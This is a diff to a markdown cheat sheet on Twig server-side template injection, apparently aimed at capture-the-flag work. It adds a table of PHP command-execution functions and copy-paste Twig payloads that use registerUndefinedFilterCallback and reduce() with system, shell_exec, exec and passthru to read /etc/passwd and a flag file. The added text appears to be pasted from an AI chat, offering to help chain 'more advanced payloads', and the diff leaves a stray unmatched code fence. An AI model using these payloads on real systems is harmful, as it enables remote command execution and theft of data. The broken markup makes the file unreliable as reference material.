@@ -181,7 +181,7 @@ ${x("cat /flag")}
 ### Detection / Exploitation
 
 Same as Twig:
-
+```
 ```twig
 {{ _self.env.registerUndefinedFilterCallback('system') }}
 {{ 'cat /etc/passwd'|filter }}
@@ -207,3 +207,56 @@ Look for variables like:
 
 **Disclaimer**: Use this information only on systems you are authorized to test.
 
+PHP Functions That Can Execute External Programs
+
+Many PHP functions can execute commands. Here are common ones that accept a single argument (ideal for reduce()):
+Function	Description	Usage Example
+system()	Executes a command and outputs	system('id')
+exec()	Executes and returns last line	exec('ls')
+shell_exec()	Executes via shell and returns output	shell_exec('whoami')
+passthru()	Executes and outputs raw result	passthru('cat /etc/passwd')
+popen()	Opens process pipe (requires fread)	Not usable with reduce() alone
+proc_open()	Too complex — not usable here	❌
+🔧 Try These Payloads (Replace system with each)
+
+```twig
+{{ [0]|reduce('shell_exec','cat /var/www/flag.txt') }}
+{{ [0]|reduce('exec','cat /var/www/flag.txt') }}
+{{ [0]|reduce('passthru','cat /var/www/flag.txt') }}
+```
+
+💡 These are copy/paste ready. Just try each and see which works.
+🧪 What's Happening?
+
+With Twig's reduce, the syntax is:
+
+array|reduce(callback_function, initial_value)
+
+So with:
+
+```twig
+[0]|reduce('shell_exec', 'cat /var/www/flag.txt')
+```
+
+You're effectively executing:
+
+shell_exec('cat /var/www/flag.txt');
+
+Which returns the flag if allowed.
+🚨 Important Notes
+
+    Some PHP functions like popen() or proc_open() need more than one argument or extra handling, so they won't work with reduce() directly.
+
+    If one function doesn't work, try the next — it might be due to sandbox restrictions.
+
+✅ Summary
+
+Try each of these in your Twig sandbox:
+
+```twig
+{{ [0]|reduce('shell_exec','cat /var/www/flag.txt') }}
+{{ [0]|reduce('exec','cat /var/www/flag.txt') }}
+{{ [0]|reduce('passthru','cat /var/www/flag.txt') }}
+```
+
+If successful, you’ll see the flag displayed. Let me know the output or if you want help chaining more advanced payloads!
